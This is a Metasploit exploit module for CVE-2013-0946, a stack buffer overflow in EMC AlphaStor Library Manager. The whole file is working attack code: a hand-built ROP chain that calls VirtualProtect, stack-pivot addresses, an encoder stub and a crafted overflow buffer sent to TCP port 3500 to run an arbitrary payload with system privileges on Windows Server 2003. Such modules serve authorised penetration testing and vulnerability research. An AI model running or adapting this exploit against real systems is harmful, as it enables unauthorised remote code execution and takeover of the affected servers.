require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'EMC AlphaStor Library Manager Opcode 0x4f',
			'Description'    => %q{
				This module exploits a stack based buffer overflow found in EMC
				Alphastor Library Manager version < 4.0 build 910. The overflow
				is triggered due to a lack of sanitization of the pointers used
				for two strcpy functions.
			},
			'Author'         => [ 'james fitts' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-14-029/' ],
					[ 'CVE', '2013-0946' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
					'wfsdelay'	=>	1000
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'	=> 160,
					'DisableNops'	=> 'true',
					'BadChars' => "\x00\x09\x0a\x0d",
					'StackAdjustment' => -404,
					'PrependEncoder' => "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff",
					'Compat'        =>
						{
							'SymbolLookup' => 'ws2ord',
						},
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 
						'Windows Server 2003 SP2 EN', 
							{ 
								# msvcrt.dll
								# add esp, 0c/ retn
								'Ret' => 0x77bdda70, 
							} 
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Feb 13 2014'))

		register_options(
			[
				Opt::RPORT(3500)
			], self.class )
	end

	def exploit
		connect

		p =  "\x90" * 8
		p << payload.encoded

		# msvcrt.dll
		# 96 bytes
		rop = [
			0x77bb2563,	# pop eax/ retn 
      0x77ba1114,	# ptr to kernel32!virtualprotect
      0x77bbf244,	# mov eax, dword ptr [eax]/ pop ebp/ retn
      0xfeedface,
      0x77bb0c86,	# xchg eax, esi/ retn
      0x77bc9801,	# pop ebp/ retn
      0x77be2265,
      0x77bb2563,	# pop eax/ retn
      0x03C0990F,
      0x77bdd441,	# sub eax, 3c0940fh/ retn
      0x77bb48d3,	# pop eax/ retn
      0x77bf21e0,
      0x77bbf102,	# xchg eax, ebx/ add byte ptr [eax], al/ retn
      0x77bbfc02,	# pop ecx/ retn
      0x77bef001,
      0x77bd8c04,	# pop edi/ retn
      0x77bd8c05,
      0x77bb2563,	# pop eax/ retn
      0x03c0984f,
      0x77bdd441,	# sub eax, 3c0940fh/ retn
      0x77bb8285,	# xchg eax, edx/ retn
      0x77bb2563,	# pop eax/ retn
      0x90909090,
      0x77be6591,	# pushad/ add al, 0efh/ retn
		].pack("V*")

		buf = Rex::Text.pattern_create(514)
		buf[0, 2] =  "O~"											# opcode
		buf[13, 4] = [0x77bdf444].pack('V')		# stack pivot 52
		buf[25, 4] = [target.ret].pack('V')		# stack pivot 12
		buf[41, 4] = [0x77bdf444].pack('V')		# stack pivot 52
		buf[57, 4] = [0x01167e20].pack('V')		# ptr
		buf[69, rop.length] = rop
		buf[165, 4] = [0x909073eb].pack('V')	# jmp $+117
		buf[278, 4] = [0x0116fd59].pack('V')	# ptr
		buf[282, p.length] = p
		buf[512, 1] = "\x00"

		# junk
		buf << "AAAA"
		buf << "BBBB"
		buf << "CCCC"
		buf << "DDDD"

		print_status("Trying target %s..." % target.name)

		sock.put(buf)

		handler
		disconnect
	end

end